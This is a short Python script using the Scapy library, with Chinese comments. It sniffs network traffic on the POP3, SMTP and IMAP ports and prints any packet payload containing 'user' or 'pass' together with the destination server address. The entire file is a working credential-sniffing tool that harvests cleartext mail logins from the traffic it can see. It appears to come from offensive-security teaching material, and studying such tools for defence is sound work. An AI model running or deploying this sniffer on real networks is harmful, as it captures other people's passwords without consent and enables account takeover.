#-*- coding:utf8 -*-  
  
from  scapy.all  import  *  
  
# 定義封包回呼函式  
def  packet_callback(packet):  
  
    if  packet[TCP].payload:  
        mail_packet = str(packet[TCP].payload)  
        if  "user"  in  mail_packet.lower()  or  "pass"  in  mail_packet.lower():  
  
            print  "[*] Server: %s"  % packet[IP].dst  
            print  "[*] %s"  % packet[TCP].payload  
    # print packet.show()  
  
# 開啟sniffer (對常見電子郵件端口進行嗅探１１０（ＰＯＰ３）， ２５（ＳＭＴＰ）， １４３（ＩＭＡＰ), store=0:不保留原始數據包，長時間sniff的話不會使用太多記憶體
sniff(filter= "tcp port 110 or tcp port 25 or tcp port 143" , prn=packet_callback, store= 0 ) 